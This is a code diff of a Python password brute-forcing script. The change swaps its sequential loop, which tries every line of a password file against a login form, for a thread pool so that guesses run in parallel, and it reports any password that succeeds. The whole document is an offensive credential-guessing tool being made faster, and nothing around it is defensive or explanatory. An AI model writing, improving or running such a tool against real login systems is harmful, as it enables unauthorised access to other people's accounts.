@@ -1,4 +1,5 @@
 import requests
+import concurrent.futures
 
 def brute_force_login(username):
     try:
@@ -6,7 +7,7 @@ def brute_force_login(username):
         passwords = password_file.readlines()
         password_file.close()
 
-        for password in passwords:
+        def check_password(password):
             password = password.strip()
             login_data = {
                 "username": username,
@@ -18,11 +19,16 @@ def brute_force_login(username):
                 print("Login successful!")
                 print("Username:", username)
                 print("Password:", password)
-                break
+                return True
             else:
                 print("Login failed with password:", password)
+                return False
 
-        print("Brute force attack completed.")
+        with concurrent.futures.ThreadPoolExecutor() as executor:
+            results = executor.map(check_password, passwords)
+
+        if not any(results):
+            print("Brute force attack completed. No valid password found.")
 
     except FileNotFoundError:
         print("Password file not found.")
